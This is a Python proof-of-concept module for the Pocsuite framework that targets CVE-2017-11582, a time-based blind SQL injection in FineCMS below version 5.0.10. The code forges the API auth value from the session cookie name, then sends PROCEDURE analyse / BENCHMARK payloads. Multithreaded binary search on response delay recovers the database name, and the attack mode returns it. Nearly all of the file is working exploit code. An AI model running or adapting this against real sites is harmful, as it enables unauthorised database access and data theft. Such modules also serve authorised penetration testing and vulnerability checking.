#!/usr/bin/python
# -*- coding:utf-8 -*-

import time
import threading
import Queue
import hashlib
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

data = {}


def get_length(url, payload):
    max = 20
    min = 0
    while min != max - 1:
        center = int((min + max) / 2)
        ipayload = payload.format(center)
        time_start = time.time()
        resp = req.get(url + ipayload)
        time_end = time.time()
        if time_end - time_start > 2:
            min = center
        else:
            max = center
    leng = max
    return leng


class TextThread(threading.Thread):
    def __init__(self, url, payload, queue):
        threading.Thread.__init__(self)
        self.url = url
        self.payload = payload
        self.__queue = queue

    def run(self):
        global data
        url = self.url
        payload = self.payload
        queue = self.__queue
        while not queue.empty():
            max = 128
            min = 0
            init = queue.get()
            while min != max - 1:
                center = int((min + max) / 2)
                ipayload = payload.format(init, center)
                time_start = time.time()
                resp = req.get(url + ipayload)
                time_end = time.time()
                if time_end - time_start > 2:
                    min = center
                else:
                    max = center
                print(max)
            data[init] = chr(max)


def get_text(url, payload, leng):
    queue = Queue.Queue()
    for i in range(1, leng + 1):
        queue.put(i)

    thread_count = 8
    threads = []
    for i in range(0, thread_count):
        thread = TextThread(url, payload, queue)
        thread.start()
        threads.append(thread)

    for Thread in threads:
        Thread.join()


class TestPOC(POCBase):
    name = 'finecms Template limit sql injection'
    vulID = 'CVE-2017-11582'
    author = ['cws6']
    vulType = 'sql-inj'
    version = '1'
    references = [
        'https://lorexxar.cn/2017/07/26/finecms%E5%88%86%E6%9E%90/#Template-php-num%E5%8F%98%E9%87%8F-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2017-11582']
    desc = '''finecms Template  在related和tags均存在limit注入'''

    vulDate = '2017-07-26'
    createDate = '2019-04-30'
    updateDate = '2019-04-30'

    appName = 'finecms'
    appVersion = '<v5.0.10'
    samples = ['threading', 'Queue', 'time', 'hashlib']
    appPowerLink = 'http://www.finecms.net/'

    def get_sys_key(self):
        resp = req.get(self.url)
        cookie_list = resp.cookies.get_dict().keys() 
        for i in cookie_list:
            if 'ci_session' in i:
                cookie = i[:-11]
        cookie_md5 = hashlib.md5()
        cookie_md5.update(cookie)
        return cookie_md5.hexdigest()



    def _attack(self):
        """attack mode"""
        result = {}
        md5_cookie = self.get_sys_key()
        self.url = self.url.strip(
            '/') + '/index.php?c=api&m=data2&auth=' + md5_cookie + '&param=action=tags catid=12 tag=12 num=1'
        payload1 = '/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,(IF(MID(length(database()),1,1)>{0},BENCHMARK(7000000,SHA1(1)),1)))),1);'
        payload2 = '/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,(IF(ascii(MID(database(),{0},1))>{1},BENCHMARK(4000000,SHA1(1)),1)))),1);'
        length = get_length(self.url, payload1)
        get_text(self.url, payload2, length)
        if data:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = ''.join(data.values())
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        md5_cookie = self.get_sys_key()
        self.url = self.url.strip(
            '/') + '/index.php?c=api&m=data2&auth=' + md5_cookie + '&param=action=tags catid=12 tag=12 num=1'
        payload = '/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,(IF(MID(length(database()),1,1)>{0},BENCHMARK(7000000,SHA1(1)),1)))),1);'
        length = get_length(self.url, payload)
        print(length)
        if length:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
